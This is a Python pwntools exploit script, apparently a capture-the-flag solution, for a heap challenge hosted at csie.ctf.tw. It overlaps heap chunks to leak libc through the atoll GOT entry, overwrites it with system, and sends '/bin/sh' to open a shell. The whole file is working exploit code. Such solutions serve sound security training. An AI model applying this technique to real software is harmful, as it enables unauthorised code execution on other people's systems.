from pwn import *

host = '127.0.0.1'
port = 8888
host = 'csie.ctf.tw'
port = 10143
r = remote(host, port)

def allocate(size, content):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    r.sendline(content)

def free(index):
    r.recvuntil(':')
    r.sendline(b'2')
    r.recvuntil(':')
    r.sendline(str(index).encode())

def add_shik(magic):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(magic)

def show_shik():
    r.recvuntil(':')
    r.sendline(b'4')

def edit_shik(magic):
    r.recvuntil(':')
    r.sendline(b'5')
    r.recvuntil(':')
    r.sendline(magic)

allocate(0x30, b'a') #0
allocate(0x160, b'a'*0xf0+p64(0x100)) #1
allocate(0xf0, b'a') #2

free(1)
free(0)

allocate(0x38, b'a'*0x38) #0
allocate(0x80, b'a') #1
add_shik(b'b')

free(1)
free(2)

atoll_got = 0x602058
allocate(0x260, b'a'*0x90+p64(atoll_got)) #1
show_shik()
r.recvuntil('Magic: ')
atoll = u64(r.recvuntil('#')[:-1].ljust(8, b'\x00'))
print('atoll =', hex(atoll))
libc = atoll - 0x36eb0
system = libc + 0x45390
edit_shik(p64(system))

r.recvuntil(':')
r.sendline(b'/bin/sh')

r.interactive()
